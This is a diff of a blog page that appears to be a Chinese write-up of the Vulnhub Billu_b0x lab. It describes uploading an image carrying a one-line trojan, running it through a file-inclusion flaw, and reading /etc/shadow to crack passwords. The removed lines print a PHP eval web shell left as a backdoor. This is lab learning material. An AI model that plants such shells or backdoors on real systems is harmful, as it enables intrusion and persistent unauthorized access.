@@ -114,8 +114,7 @@
 <meta property="og:image" content="http://yoursite.com/picture/1545181369534.png">
 <meta property="og:image" content="http://yoursite.com/picture/1545181410560.png">
 <meta property="og:image" content="http://yoursite.com/picture/1545181280667.png">
-<meta property="og:image" content="http://yoursite.com/picture/1543295522480.png">
-<meta property="og:updated_time" content="2019-01-02T08:24:35.705Z">
+<meta property="og:updated_time" content="2019-01-13T03:39:52.933Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Vulnhub-Billu_b0x 靶机的渗透测试学习记录">
 <meta name="twitter:description" content="靶机Vulnhub–Billu_b0x 下载链接 目标Boot to root：通过各种方式获取虚拟机的root权限。 我的攻击机是kali。靶机直接用VMware打开就行了，设置网络模式为NAT。这个靶机打开后是要登陆的，因为不知道用户名和密码，所以没法登陆，开机就好了。  ​     工具 nmap 发现目标ip，并进行端口扫描及服务识别 dirb  爆破目录 dirbuster 爆破目录 s">
@@ -406,7 +405,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  2.6k字
+                  2.5k字
                 </span>
               
 
@@ -558,6 +557,7 @@
 <p>随便找张图片，用记事本打开，将一句话木马加到文件最下面</p>
 <p><img src="/picture/1543293020109.png" alt="1543293020109"></p>
 <p>然后上传到服务器上，但是我好像遇到了点小问题……它死活都不让我上传………我去网上查了下大佬写的攻略，发现就是这么构造的啊…..日常非洲人</p>
+<hr>
 <p>昨天我又试了一遍，发现可以了……..真的是打扰了</p>
 <p>将图片上传到服务器后，利用panel页面的文件包含漏洞去执行cmd马</p>
 <blockquote>
@@ -589,13 +589,6 @@
 <p><img src="/picture/1545181280667.png" alt="1545181280667"></p>
 <p>有了root权限后，将/etc/passwd 和 /etc/shadow文件读取出来。然后可以暴力破解root用户密码</p>
 <p>这一步我就没有做了</p>
-<p>重启大法走一波，额额额 ，还是不行，不理了，直接root登陆在phpmy文件夹下留个一句话木马</p>
-<blockquote>
-<p>&lt;?php eval($_POST[‘ant’]); ?&gt;</p>
-</blockquote>
-<p>然后用蚁剑链接</p>
-<p><img src="/picture/1543295522480.png" alt="1543295522480"></p>
-<p>就留了个后门<br>这个靶场的渗透测试就完成了。这是一个比较基础的，适合新手的靶场，还是挺有意思的。</p>
 
       
     </div>
@@ -860,7 +853,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">40.7k</span>
+    <span title="Site words total count">40.6k</span>
   
 </div>
 
